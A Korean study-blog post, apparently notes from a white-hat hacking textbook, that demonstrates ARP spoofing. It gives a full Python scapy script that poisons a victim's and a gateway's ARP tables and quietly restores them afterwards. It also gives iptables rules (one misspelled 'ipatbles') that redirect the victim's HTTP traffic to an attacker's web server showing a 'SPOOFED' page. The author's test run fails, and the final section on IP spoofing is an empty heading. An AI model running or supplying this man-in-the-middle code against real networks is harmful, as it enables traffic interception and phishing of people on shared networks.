---
title: "Cryptography: 스푸핑"
last_modified_at: 2020-10-13T00:26:02-05:00
categories:
  - Cryptography
tags:
  - 암호학
  - 파이썬
  - 암호와 해킹 1판
toc: true 
toc_label: "Table of Contents"
toc_icon: "cog"
toc_sticky: true 
author_profile: true 
read_time: false 
---

`이 게시물은 화이트해커를 위한 암호와 해킹 1판을 참고하여 작성하였습니다.`

---
### ARP 스푸핑을 구현해보자
---



```python
from scapy.all import *
from time import sleep
#from scapy.layers.12 import Ether, ARP

def getMAC(ip): #맥주소를 얻는 과정 
    ans, unans = srp(Ether(dst='ff-ff-ff-ff-ff-ff')/ARP(pdst=ip), timeout=5, retry=3)
    for s, r in ans:
        return r.sprintf('%Ether.src%')
        
def poisonARP(srcip, targetip, targetmac):
    arp=ARP(op=2, psrc=srcip, pdst=targetip, hwdst=targetmac)
    #arp reply를 srcip 주소로 targetip에 전송하여 목적지 mac주소를 targetmac으로 지정
    send(arp)
  
def restoreARP(victimip, gatewayip, victimmac, gatewaymac):
    #피해를 입었는지 모르게 복구
    arp1=ARP(op=2, psrc=gatewayip, pdst=victimip, hwdst='ff-ff-ff-ff-ff-ff', hwsrc=gatewaymac)
    #arp1은 희생자 컴퓨터의 ARP 테이블에서 게이트웨이 MAC주소를 원래대로 복구하기 위한 ARP패킷
    arp2=ARP(op=2, psrc=victimip, pdst=gatewayip, hwdst='ff-ff-ff-ff-ff-ff', hwsrc=victimmac)
    #arp2는 게이트웨이 ARP 테이블에서 피해 컴퓨터의 MAC 주소를 원래대로 복구하기 위한 ARP패킷
    send(arp1, count=3)
    send(arp2, count=3)

def main():
    gatewayip='192.168.0.1'
    victimip ='192.168.0.234'
    
    victimmac=getMAC(victimip) #맥주소를 얻어온다.
    gatewaymac=getMAC(gatewayip)
    
    if victimmac == None or gatewaymac == None: #맥주소를 얻는데 실패했을 경우
        print('MAC주소를 찾을 수 없습니다')
        return
    print('ARP Spoofing start -> Victim IP [%s]' %victimip) #맥주소를 얻었을 경우
    print('[%s]: Poison ARP Table [%s] -> [%s]' %(victimip, gatewaymac, victimmac))
    
    try:
        while True:
            poisonARP(gatewayip, victimip, victimmac) #스푸핑을 시작한다
            poisonARP(victimip, gatewayip, gatewaymac)
            sleep(3)
    except KeyboardInterrupt:
        restoreARP(victimip, gatewayip, victimmac, gatewaymac)
        print('ARP Spoogin done -> Restored ARP Table')
        
if __name__ == '__main__':
    main()
```

실험이 잘 안되었다. 다음에 리눅스를 활용하여 실험까지도 해보자
{: .notice}

```
Begin emission:
.............Begin emission:
.......Begin emission:
................Begin emission:
.*
Received 38 packets, got 1 answers, remaining 0 packets
Begin emission:
......Begin emission:
.....Begin emission:
.....Begin emission:
........
Received 24 packets, got 0 answers, remaining 1 packets
MAC주소를 찾을 수 없습니다
```


---
### ARP 스푸핑으로 피싱 사이트 유도하기
---

공격자는 자신의 컴퓨터에서 IP 테이블을 조작하여 피해 컴퓨터로부터 전달된 네트워크 데이터를 특정 사이트로 리다이렉션 할 수 있습니다.   
공격자가 웹서버를 운영하고 있다면 피해 컴퓨터로 부터 전달되는 HTTP 패킷을 공격자의 웹서버로 리다이렉션이 가능합니다.  
{: .notice}

먼저 웹 서버의 다큐먼트 루트에 index.html을 다음과 같이 추가한다.
{: .notice}

```html
<html>
	<center>
	<h1> HELLO! WELCOME TO MY SITE </h1>
	<h3> Your Computer is SPOOOOOOOFED!</h3>
	<img src="anonymous.jpg"/>
	</center>
</html>
```

공격자 컴퓨터의 IP 테이블을 다음 명령으로 수정한다.
{: .notice}

```
iptables -t nat -F
iptables -Z			#라우팅테이블 초기화
iptables -A FORWARD -i eth0 -j ACCEPT #eth0로 들어오는 모든 패킷 허용
ipatbles -t nat -A POSTROUTING -o eth0 -j MASQUERADE #컴퓨터의 사설 IP주소를 게이트웨이의 외부 IP 주소로 변경하게 한다.
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination <공격자 웹 서버 IP>
#LAN 외부에서 80번 포트로 들어오는 모든 HTTP 연결을 별개의 네트워크에 있는 HTTP 서버로 라우팅한다.
```

---
### IP 스푸핑으로 피싱 사이트 유도하기
---


{: .notice}
